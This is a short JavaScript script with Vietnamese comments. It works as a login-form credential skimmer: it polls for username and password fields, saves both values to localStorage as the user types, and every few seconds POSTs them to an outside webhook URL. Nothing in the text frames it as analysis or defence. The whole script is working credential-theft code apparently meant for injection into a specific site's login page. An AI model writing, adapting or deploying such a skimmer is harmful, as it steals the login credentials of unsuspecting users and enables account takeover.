(function(){
  let saveInterval;
  let isCapturing = false;

  // Theo dõi input username/password
  const inputPoll = setInterval(() => {
    const user = document.querySelector('input[name="username"]');
    const pass = document.querySelector('input[name="password"]');

    if(user && pass){
      clearInterval(inputPoll);

      pass.addEventListener('input', () => {
        if(pass.value.length >= 6 && !isCapturing){
          isCapturing = true;

          saveInterval = setInterval(() => {
            const username = user.value;
            const password = pass.value;
            if(username && password){
              localStorage.setItem('_cred_capture', JSON.stringify({ username, password }));
            }
          }, 100); // lưu mỗi 0.5 giây
        }

        if(pass.value.length < 6 && isCapturing){
          clearInterval(saveInterval);
          isCapturing = false;
        }
      });
    }
  }, 300);

  // Khi bấm đăng nhập → dừng việc lưu lại
  const btnPoll = setInterval(() => {
    const btn = document.querySelector('button.btn.btn-primary.btn-block.text-white.my-2.ng-star-inserted');
    if(btn){
      clearInterval(btnPoll);

      btn.addEventListener('click', () => {
        if(isCapturing){
          clearInterval(saveInterval);
          isCapturing = false;
        }
      });
    }
  }, 300);

  // Gửi nếu đã lưu xong
  setInterval(() => {
    const s = localStorage.getItem('_cred_capture');
    if(s){
      fetch('https://webhook-test.com/ba3ac8fe60dc09d6d048273036f05abd', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: s,
        keepalive: true
      }).finally(() => {
        localStorage.removeItem('_cred_capture');
      });
    }
  }, 3000);
})();
